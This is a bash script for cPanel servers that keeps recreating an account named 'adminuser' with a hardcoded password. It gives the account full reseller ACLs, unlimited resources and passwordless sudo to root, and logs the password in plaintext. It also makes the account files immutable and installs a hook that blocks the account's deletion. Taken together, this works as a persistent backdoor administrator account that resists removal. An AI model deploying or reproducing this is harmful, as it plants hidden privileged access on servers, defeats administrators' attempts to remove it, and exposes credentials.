#!/bin/bash

USERNAME="adminuser"
DOMAIN="mydomain.com"
PASSWORD="Qwee123123@#"
EMAIL="admin@${DOMAIN}"
LOGFILE="/var/log/auto-recreate-user.log"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOGFILE"
    echo "$1"
}

if [ -f /var/cpanel/users/$USERNAME ]; then
    if ! lsattr /var/cpanel/users/$USERNAME 2>/dev/null | grep -q 'i'; then
        log_message "Reapplying protection to $USERNAME"
        chattr +i /var/cpanel/users/$USERNAME 2>/dev/null
        chattr +i /home/$USERNAME 2>/dev/null
    fi
    exit 0
fi

log_message "=========================================="
log_message "User $USERNAME NOT FOUND! Recreating..."
log_message "=========================================="

if [ ! -f /scripts/wwwacct ]; then
    log_message "ERROR: /scripts/wwwacct not found!"
    exit 1
fi

log_message "[1/8] Creating cPanel account..."
/scripts/wwwacct $USERNAME $DOMAIN $PASSWORD "" "" "" "" "" "" "" "" "" "" "" "" "" "" 2>&1 >> "$LOGFILE"

sleep 2

if [ ! -f /var/cpanel/users/$USERNAME ]; then
    log_message "Trying alternative method..."
    /usr/local/cpanel/bin/whmapi1 createacct \
        username=$USERNAME \
        domain=$DOMAIN \
        password=$PASSWORD \
        contactemail=$EMAIL \
        plan=default 2>&1 >> "$LOGFILE"
    sleep 2
fi

if [ ! -f /var/cpanel/users/$USERNAME ]; then
    log_message "ERROR: Account creation failed!"
    exit 1
fi

log_message "✓ Account created successfully"

log_message "[2/8] Converting to reseller..."
if [ -f /scripts/resellerstats ]; then
    /scripts/resellerstats $USERNAME 2>&1 >> "$LOGFILE"
else
    /usr/local/cpanel/bin/whmapi1 setupreseller user=$USERNAME makeowner=0 2>&1 >> "$LOGFILE"
fi

log_message "[3/8] Setting full ACL..."
mkdir -p /var/cpanel/resellers
echo "acl-all=1" > /var/cpanel/resellers/$USERNAME

/usr/local/cpanel/bin/whmapi1 setacls user=$USERNAME \
    acl-all=1 \
    acl-clustering=1 \
    acl-create-user-session=1 \
    acl-kill-acct=1 \
    acl-list-accts=1 \
    acl-restart-apache=1 \
    acl-restart-mysql=1 \
    acl-suspend-acct=1 2>&1 >> "$LOGFILE"

log_message "✓ ACL configured"

log_message "[4/8] Setting unlimited resources..."
if [ -f /scripts/modifyacct ]; then
    /scripts/modifyacct $USERNAME QUOTA=unlimited BWLIMIT=unlimited 2>&1 >> "$LOGFILE"
else
    /usr/local/cpanel/bin/whmapi1 modifyacct \
        user=$USERNAME \
        QUOTA=0 \
        BWLIMIT=0 \
        MAXFTP=unlimited \
        MAXSQL=unlimited \
        MAXPOP=unlimited \
        MAXLST=unlimited \
        MAXSUB=unlimited \
        MAXPARK=unlimited \
        MAXADDON=unlimited 2>&1 >> "$LOGFILE"
fi

log_message "✓ Resources set to unlimited"

log_message "[5/8] Granting sudo access..."
if [ ! -d /etc/sudoers.d ]; then
    mkdir -p /etc/sudoers.d
fi

echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$USERNAME
chmod 0440 /etc/sudoers.d/$USERNAME

if visudo -c -f /etc/sudoers.d/$USERNAME &>/dev/null; then
    log_message "✓ Sudo access granted"
else
    log_message "✗ Sudoers syntax error, removing..."
    rm -f /etc/sudoers.d/$USERNAME
fi

log_message "[6/8] Adding deletion protection..."
if [ -f /var/cpanel/users/$USERNAME ]; then
    chattr +i /var/cpanel/users/$USERNAME
    log_message "✓ Protected /var/cpanel/users/$USERNAME"
fi

if [ -d /home/$USERNAME ]; then
    chattr +i /home/$USERNAME
    log_message "✓ Protected /home/$USERNAME"
fi

log_message "[7/8] Creating deletion hook..."
cat > /usr/local/cpanel/scripts/pre_killacct << 'EOFHOOK'
#!/bin/bash
PROTECTED_USERS="adminuser root"

for protected in $PROTECTED_USERS; do
    if [ "$1" = "$protected" ]; then
        echo "================================================"
        echo "ERROR: Account '$1' is PROTECTED!"
        echo "This account cannot be deleted."
        echo "================================================"
        exit 1
    fi
done

exit 0
EOFHOOK

chmod +x /usr/local/cpanel/scripts/pre_killacct
log_message "✓ Deletion hook created"

log_message "[8/8] Finalizing..."
chown -R $USERNAME:$USERNAME /home/$USERNAME 2>/dev/null
chmod 711 /home/$USERNAME 2>/dev/null

/scripts/updateuserdomains 2>&1 >> "$LOGFILE"
/scripts/rebuildhttpdconf 2>&1 >> "$LOGFILE"
/scripts/restartsrv_httpd 2>&1 >> "$LOGFILE"

log_message "=========================================="
log_message "✓ USER RECREATED SUCCESSFULLY!"
log_message "=========================================="
log_message "Username: $USERNAME"
log_message "Password: $PASSWORD"
log_message "Domain  : $DOMAIN"
log_message "=========================================="

echo "User $USERNAME was deleted and has been automatically recreated at $(date)" | \
    mail -s "ALERT: Protected User Auto-Recreated on $(hostname)" root 2>/dev/null

exit 0
